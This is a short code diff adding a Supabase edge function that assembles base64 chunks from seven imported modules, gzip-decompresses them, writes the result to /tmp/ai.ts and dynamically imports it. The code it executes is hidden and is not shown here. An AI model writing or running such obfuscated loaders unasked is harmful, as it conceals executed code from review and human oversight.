@@ -1,1 +1,16 @@
-PLACEHOLDER_WILL_FAIL
+import "jsr:@supabase/functions-js/edge-runtime.d.ts";
+import { C0 } from "./c0.ts";
+import { C1 } from "./c1.ts";
+import { C2 } from "./c2.ts";
+import { C3 } from "./c3.ts";
+import { C4 } from "./c4.ts";
+import { C5 } from "./c5.ts";
+import { C6 } from "./c6.ts";
+const B64 = C0 + C1 + C2 + C3 + C4 + C5 + C6;
+const bin = Uint8Array.from(atob(B64), c => c.charCodeAt(0));
+const ds = new DecompressionStream("gzip");
+const stream = new Blob([bin]).stream().pipeThrough(ds);
+const buf = await new Response(stream).arrayBuffer();
+const code = new TextDecoder().decode(buf);
+await Deno.writeTextFile("/tmp/ai.ts", code);
+await import("file:///tmp/ai.ts");
